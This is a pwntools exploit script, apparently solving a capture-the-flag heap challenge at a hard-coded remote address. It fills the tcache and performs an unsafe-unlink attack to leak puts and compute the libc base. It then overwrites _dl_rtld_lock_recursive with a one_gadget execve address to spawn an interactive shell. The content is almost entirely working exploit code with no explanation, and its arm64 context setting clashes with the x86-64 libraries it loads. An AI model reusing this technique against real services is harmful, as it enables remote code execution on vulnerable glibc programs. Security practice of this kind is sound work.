from pwn import *
from LibcSearcher import *
from ctypes import *
from struct import pack

# p = process(["./ld-linux-x86-64.so.2", "./test"],
#             env={"LD_PRELOAD":"./libc.so.6"})

# p = process(["/mnt/d/desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so", "./my"],
#             env={"LD_PRELOAD":"/mnt/d/desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6"})

# p = process('./pwn')
p = remote("120.76.194.25", 5000)
context(arch='arm64', os='linux', log_level='debug')
elf = ELF('./task')
libc = ELF('./libc.so.6')
ld = ELF('./ld-linux-x86-64.so.2')

execve = [0xe3afe, 0xe3b01, 0xe3b04]

def add(size,content):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.sendline(content)

def show(index):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'4')
    p.recvuntil('index:\n')
    p.sendline(str(index))

def delete(index):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'2')
    p.recvuntil('index:\n')
    p.sendline(str(index))

def edit(index,content):
    p.recvuntil("please input your choice:\n")
    p.sendline(b'3')
    p.recvuntil('index:\n')
    p.sendline(str(index))
    p.recvuntil('content:\n')
    p.send(content)

for i in range(7):
    add(0xb0,b'aaaaa')

add(0xb0,b'aaaaa')
p.sendline(str(114514))
add(0xb0,b'aaaaa')

for i in range(7):
    delete(str(i))

p.recvuntil("please input your choice:\n")

p.sendline(str(114514))
payload = b'a' * 0x10 + p64(0xd0) + p64(0xc0)
p.sendline(payload)

payload = p64(0) + p64(0xd1) + p64(0x4040b8 - 0x18) + p64(0x4040b8 - 0x10)
edit(7,payload)
delete(8)

payload = p64(0) * 3 + p64(0x404060)
edit(7,payload)
show(7)
puts_addr = u64(p.recv(6).ljust(8,b"\x00"))
print("puts_addr =",hex(puts_addr))

libc_base = puts_addr - libc.symbols['puts']
free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

ld_base = libc_base + 0x1f4000
_rtld_global = ld_base + ld.sym['_rtld_global']
_dl_rtld_lock_recursive = _rtld_global + 0xf08
_dl_rtld_unlock_recursive = _rtld_global + 0xf10

for i in range(3):
    execve[i] += libc_base

payload = p64(0) * 11 + p64(_dl_rtld_lock_recursive)
edit(7,payload)
edit(7,p64(execve[0]))
p.sendline(b'6')

p.interactive()

